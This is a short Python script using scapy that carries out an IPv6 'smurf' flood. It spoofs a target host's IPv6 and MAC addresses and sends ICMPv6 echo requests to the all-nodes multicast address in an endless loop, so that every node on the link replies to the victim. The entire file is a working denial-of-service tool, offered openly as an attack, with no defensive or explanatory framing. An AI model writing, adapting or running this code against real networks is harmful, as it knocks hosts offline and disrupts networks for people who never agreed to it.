#!/usr/bin/python
import sys
from scapy.layers.inet6 import ICMPv6EchoRequest, IPv6, getmacbyip6
from scapy.layers.l2 import Ether
from scapy.sendrecv import send, sendp


def smurf(interface, tip):
    # Generate packet
    smac = getmacbyip6(tip)
    packet1 = Ether(src=smac) / IPv6(src=tip, dst="ff02::1") / ICMPv6EchoRequest()
    print("Smurfing all nodes to attack host " + tip + " (Ctrl C to stop the attack)")
    while True:
        try:
            if interface == "":
                sendp(packet1, verbose=False)
            else:
                sendp(packet1, verbose=False, iface=interface)
        except KeyboardInterrupt:
            break


